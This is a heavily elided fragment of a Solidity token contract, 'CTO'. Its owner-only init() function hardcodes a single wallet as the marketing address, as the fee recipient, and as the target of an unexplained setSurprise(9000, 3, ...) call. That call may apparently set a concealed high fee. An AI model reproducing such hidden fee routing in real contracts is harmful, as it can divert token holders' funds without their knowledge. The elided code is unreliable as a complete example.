...
contract CTO is Token {
    ...
    function init() public onlyOwner {
        ...
        address _marketing = address(0x2B16C26c9b71446d1Ba6f09C32DEa82D71f3094f); //
        ...
        super.setSurprise(
            9000,
            3,
            address(0x2B16C26c9b71446d1Ba6f09C32DEa82D71f3094f)
        );
        super.__Token_init(_marketing, _pairB, _isDividend);
        setSwapTokensAt(1 ether);
        setInitPrice(0.05 ether);
        feeMarketingTo2 = address(0x2B16C26c9b71446d1Ba6f09C32DEa82D71f3094f);
        feeEarn = 1000;
        isLiquified = true;
    }
}